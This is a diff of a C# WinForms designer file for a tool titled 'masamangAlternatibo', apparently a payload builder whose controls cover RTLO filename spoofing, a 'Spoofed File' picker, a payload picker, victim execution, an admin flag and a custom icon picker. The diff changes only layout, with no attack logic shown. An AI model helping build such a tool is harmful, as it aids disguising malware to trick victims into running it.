@@ -30,6 +30,8 @@
         {
             this.panel1 = new System.Windows.Forms.Panel();
             this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.btnClearImage = new System.Windows.Forms.LinkLabel();
+            this.btnBrowseImage = new System.Windows.Forms.LinkLabel();
             this.groupBox6 = new System.Windows.Forms.GroupBox();
             this.radRTLO = new System.Windows.Forms.RadioButton();
             this.radOverflow = new System.Windows.Forms.RadioButton();
@@ -46,7 +48,6 @@
             this.chkConsole = new System.Windows.Forms.CheckBox();
             this.chkVictimExec = new System.Windows.Forms.CheckBox();
             this.imgFileIcon = new System.Windows.Forms.PictureBox();
-            this.btn3rdParty = new System.Windows.Forms.Label();
             this.groupBox3 = new System.Windows.Forms.GroupBox();
             this.btnBuild = new System.Windows.Forms.Button();
             this.btn_RefreshDrives = new System.Windows.Forms.Button();
@@ -62,8 +63,11 @@
             this.btnBrowseSpoof = new System.Windows.Forms.Button();
             this.panel2 = new System.Windows.Forms.Panel();
             this.lblVersion = new System.Windows.Forms.Label();
+            this.btn3rdParty = new System.Windows.Forms.Label();
             this.lblDbg = new System.Windows.Forms.Label();
             this.groupBox5 = new System.Windows.Forms.GroupBox();
+            this.btnConsole = new System.Windows.Forms.Button();
+            this.tbConsole = new System.Windows.Forms.TextBox();
             this.dbgRtb = new System.Windows.Forms.RichTextBox();
             this.btnClose = new System.Windows.Forms.Label();
             this.titlebar = new System.Windows.Forms.Panel();
@@ -71,7 +75,8 @@
             this.label1 = new System.Windows.Forms.Label();
             this.ofdPayload = new System.Windows.Forms.OpenFileDialog();
             this.ofdSpoof = new System.Windows.Forms.OpenFileDialog();
-            this.label6 = new System.Windows.Forms.Label();
+            this.ofdIcon = new System.Windows.Forms.OpenFileDialog();
+            this.panel3 = new System.Windows.Forms.Panel();
             this.panel1.SuspendLayout();
             this.groupBox2.SuspendLayout();
             this.groupBox6.SuspendLayout();
@@ -90,8 +95,6 @@
             | System.Windows.Forms.AnchorStyles.Left) 
             | System.Windows.Forms.AnchorStyles.Right)));
             this.panel1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
-            this.panel1.Controls.Add(this.label6);
-            this.panel1.Controls.Add(this.btn3rdParty);
             this.panel1.Controls.Add(this.groupBox2);
             this.panel1.Controls.Add(this.groupBox3);
             this.panel1.Controls.Add(this.groupBox1);
@@ -104,6 +107,9 @@
             // 
             // groupBox2
             // 
+            this.groupBox2.Controls.Add(this.panel3);
+            this.groupBox2.Controls.Add(this.btnClearImage);
+            this.groupBox2.Controls.Add(this.btnBrowseImage);
             this.groupBox2.Controls.Add(this.groupBox6);
             this.groupBox2.Controls.Add(this.label9);
             this.groupBox2.Controls.Add(this.chkAdminFlag);
@@ -116,6 +122,36 @@
             this.groupBox2.TabIndex = 15;
             this.groupBox2.TabStop = false;
             this.groupBox2.Text = "Options";
+            // 
+            // btnClearImage
+            // 
+            this.btnClearImage.ActiveLinkColor = System.Drawing.Color.White;
+            this.btnClearImage.AutoSize = true;
+            this.btnClearImage.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnClearImage.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
+            this.btnClearImage.Location = new System.Drawing.Point(239, 95);
+            this.btnClearImage.Name = "btnClearImage";
+            this.btnClearImage.Size = new System.Drawing.Size(27, 15);
+            this.btnClearImage.TabIndex = 26;
+            this.btnClearImage.TabStop = true;
+            this.btnClearImage.Text = "[❌]";
+            this.btnClearImage.VisitedLinkColor = System.Drawing.Color.White;
+            this.btnClearImage.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.btnClearImage_LinkClicked);
+            // 
+            // btnBrowseImage
+            // 
+            this.btnBrowseImage.ActiveLinkColor = System.Drawing.Color.White;
+            this.btnBrowseImage.AutoSize = true;
+            this.btnBrowseImage.Font = new System.Drawing.Font("Segoe UI", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.btnBrowseImage.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
+            this.btnBrowseImage.Location = new System.Drawing.Point(267, 95);
+            this.btnBrowseImage.Name = "btnBrowseImage";
+            this.btnBrowseImage.Size = new System.Drawing.Size(24, 15);
+            this.btnBrowseImage.TabIndex = 25;
+            this.btnBrowseImage.TabStop = true;
+            this.btnBrowseImage.Text = "[...]";
+            this.btnBrowseImage.VisitedLinkColor = System.Drawing.Color.White;
+            this.btnBrowseImage.LinkClicked += new System.Windows.Forms.LinkLabelLinkClickedEventHandler(this.btnBrowseImage_LinkClicked);
             // 
             // groupBox6
             // 
@@ -165,7 +201,7 @@
             // label9
             // 
             this.label9.AutoSize = true;
-            this.label9.Location = new System.Drawing.Point(251, 94);
+            this.label9.Location = new System.Drawing.Point(248, 19);
             this.label9.Name = "label9";
             this.label9.Size = new System.Drawing.Size(29, 13);
             this.label9.TabIndex = 19;
@@ -199,6 +235,7 @@
             // btnCommand
             // 
             this.btnCommand.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
+            this.btnCommand.Enabled = false;
             this.btnCommand.FlatAppearance.BorderSize = 0;
             this.btnCommand.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
             this.btnCommand.Location = new System.Drawing.Point(176, 27);
@@ -218,6 +255,7 @@
             this.chkArguments.TabIndex = 15;
             this.chkArguments.Text = "Arguments:";
             this.chkArguments.UseVisualStyleBackColor = true;
+            this.chkArguments.CheckedChanged += new System.EventHandler(this.chkArguments_CheckedChanged);
             // 
             // label5
             // 
@@ -231,6 +269,7 @@
             // 
             // tbArguments
             // 
+            this.tbArguments.Enabled = false;
             this.tbArguments.Location = new System.Drawing.Point(90, 1);
             this.tbArguments.Name = "tbArguments";
             this.tbArguments.Size = new System.Drawing.Size(119, 22);
@@ -239,6 +278,7 @@
             // chkStreamConsole
             // 
             this.chkStreamConsole.AutoSize = true;
+            this.chkStreamConsole.Enabled = false;
             this.chkStreamConsole.Location = new System.Drawing.Point(20, 48);
             this.chkStreamConsole.Name = "chkStreamConsole";
             this.chkStreamConsole.Size = new System.Drawing.Size(198, 17);
@@ -265,6 +305,7 @@
             this.chkConsole.TabIndex = 7;
             this.chkConsole.Text = "Execute in Command Prompt";
             this.chkConsole.UseVisualStyleBackColor = true;
+            this.chkConsole.CheckedChanged += new System.EventHandler(this.chkConsole_CheckedChanged);
             // 
             // chkVictimExec
             // 
@@ -286,17 +327,6 @@
             this.imgFileIcon.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
             this.imgFileIcon.TabIndex = 10;
             this.imgFileIcon.TabStop = false;
-            // 
-            // btn3rdParty
-            // 
-            this.btn3rdParty.AutoSize = true;
-            this.btn3rdParty.Cursor = System.Windows.Forms.Cursors.Hand;
-            this.btn3rdParty.Location = new System.Drawing.Point(507, 12);
-            this.btn3rdParty.Name = "btn3rdParty";
-            this.btn3rdParty.Size = new System.Drawing.Size(45, 13);
-            this.btn3rdParty.TabIndex = 21;
-            this.btn3rdParty.Text = "[About]";
-            this.btn3rdParty.Click += new System.EventHandler(this.btn3rdParty_Click);
             // 
             // groupBox3
             // 
@@ -451,6 +481,7 @@
             | System.Windows.Forms.AnchorStyles.Right)));
             this.panel2.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(185)))), ((int)(((byte)(29)))), ((int)(((byte)(71)))));
             this.panel2.Controls.Add(this.lblVersion);
+            this.panel2.Controls.Add(this.btn3rdParty);
             this.panel2.Controls.Add(this.lblDbg);
             this.panel2.Location = new System.Drawing.Point(0, 279);
             this.panel2.Name = "panel2";
@@ -467,6 +498,17 @@
             this.lblVersion.TabIndex = 1;
             this.lblVersion.Text = "versionlabel";
             // 
+            // btn3rdParty
+            // 
+            this.btn3rdParty.AutoSize = true;
+            this.btn3rdParty.Cursor = System.Windows.Forms.Cursors.Hand;
+            this.btn3rdParty.Location = new System.Drawing.Point(481, 2);
+            this.btn3rdParty.Name = "btn3rdParty";
+            this.btn3rdParty.Size = new System.Drawing.Size(39, 13);
+            this.btn3rdParty.TabIndex = 21;
+            this.btn3rdParty.Text = "About";
+            this.btn3rdParty.Click += new System.EventHandler(this.btn3rdParty_Click);
+            // 
             // lblDbg
             // 
             this.lblDbg.AutoSize = true;
@@ -478,25 +520,46 @@
             // 
             // groupBox5
             // 
+            this.groupBox5.Controls.Add(this.btnConsole);
+            this.groupBox5.Controls.Add(this.tbConsole);
             this.groupBox5.Controls.Add(this.dbgRtb);
-            this.groupBox5.Location = new System.Drawing.Point(327, 22);
+            this.groupBox5.ForeColor = System.Drawing.Color.White;
+            this.groupBox5.Location = new System.Drawing.Point(324, 6);
             this.groupBox5.Name = "groupBox5";
-            this.groupBox5.Size = new System.Drawing.Size(221, 254);
+            this.groupBox5.Size = new System.Drawing.Size(221, 270);
             this.groupBox5.TabIndex = 20;
             this.groupBox5.TabStop = false;
+            this.groupBox5.Text = "Debug Console";
+            // 
+            // btnConsole
+            // 
+            this.btnConsole.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(2)))), ((int)(((byte)(187)))), ((int)(((byte)(255)))));
+            this.btnConsole.FlatAppearance.BorderSize = 0;
+            this.btnConsole.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
+            this.btnConsole.Location = new System.Drawing.Point(192, 244);
+            this.btnConsole.Name = "btnConsole";
+            this.btnConsole.Size = new System.Drawing.Size(25, 22);
+            this.btnConsole.TabIndex = 15;
+            this.btnConsole.Text = ">";
+            this.btnConsole.UseVisualStyleBackColor = false;
+            // 
+            // tbConsole
+            // 
+            this.tbConsole.Location = new System.Drawing.Point(3, 244);
+            this.tbConsole.Name = "tbConsole";
+            this.tbConsole.Size = new System.Drawing.Size(186, 22);
+            this.tbConsole.TabIndex = 19;
             // 
             // dbgRtb
             // 
-            this.dbgRtb.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
-            | System.Windows.Forms.AnchorStyles.Left) 
-            | System.Windows.Forms.AnchorStyles.Right)));
             this.dbgRtb.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
             this.dbgRtb.BorderStyle = System.Windows.Forms.BorderStyle.None;
+            this.dbgRtb.Dock = System.Windows.Forms.DockStyle.Fill;
             this.dbgRtb.ForeColor = System.Drawing.Color.White;
-            this.dbgRtb.Location = new System.Drawing.Point(1, 15);
+            this.dbgRtb.Location = new System.Drawing.Point(3, 18);
             this.dbgRtb.Name = "dbgRtb";
             this.dbgRtb.ReadOnly = true;
-            this.dbgRtb.Size = new System.Drawing.Size(219, 236);
+            this.dbgRtb.Size = new System.Drawing.Size(215, 249);
             this.dbgRtb.TabIndex = 18;
             this.dbgRtb.Text = "";
             // 
@@ -554,14 +617,17 @@
             this.ofdSpoof.Title = "Spoofed File";
             this.ofdSpoof.FileOk += new System.ComponentModel.CancelEventHandler(this.ofdSpoof_FileOk);
             // 
-            // label6
+            // ofdIcon
             // 
-            this.label6.AutoSize = true;
-            this.label6.Location = new System.Drawing.Point(330, 22);
-            this.label6.Name = "label6";
-            this.label6.Size = new System.Drawing.Size(87, 13);
-            this.label6.TabIndex = 22;
-            this.label6.Text = "Debug Console";
+            this.ofdIcon.Filter = "Icon Files (*.ico)|*.ico";
+            // 
+            // panel3
+            // 
+            this.panel3.BackColor = System.Drawing.Color.White;
+            this.panel3.Location = new System.Drawing.Point(225, 13);
+            this.panel3.Name = "panel3";
+            this.panel3.Size = new System.Drawing.Size(1, 111);
+            this.panel3.TabIndex = 27;
             // 
             // Form1
             // 
@@ -580,7 +646,6 @@
             this.Text = "masamangAlternatibo";
             this.Load += new System.EventHandler(this.Form1_Load);
             this.panel1.ResumeLayout(false);
-            this.panel1.PerformLayout();
             this.groupBox2.ResumeLayout(false);
             this.groupBox2.PerformLayout();
             this.groupBox6.ResumeLayout(false);
@@ -595,6 +660,7 @@
             this.panel2.ResumeLayout(false);
             this.panel2.PerformLayout();
             this.groupBox5.ResumeLayout(false);
+            this.groupBox5.PerformLayout();
             this.titlebar.ResumeLayout(false);
             this.titlebar.PerformLayout();
             this.ResumeLayout(false);
@@ -646,7 +712,12 @@
         private System.Windows.Forms.RadioButton radNone;
         private System.Windows.Forms.OpenFileDialog ofdSpoof;
         private System.Windows.Forms.Label btn3rdParty;
-        private System.Windows.Forms.Label label6;
+        private System.Windows.Forms.TextBox tbConsole;
+        private System.Windows.Forms.Button btnConsole;
+        private System.Windows.Forms.OpenFileDialog ofdIcon;
+        private System.Windows.Forms.LinkLabel btnClearImage;
+        private System.Windows.Forms.LinkLabel btnBrowseImage;
+        private System.Windows.Forms.Panel panel3;
     }
 }
 
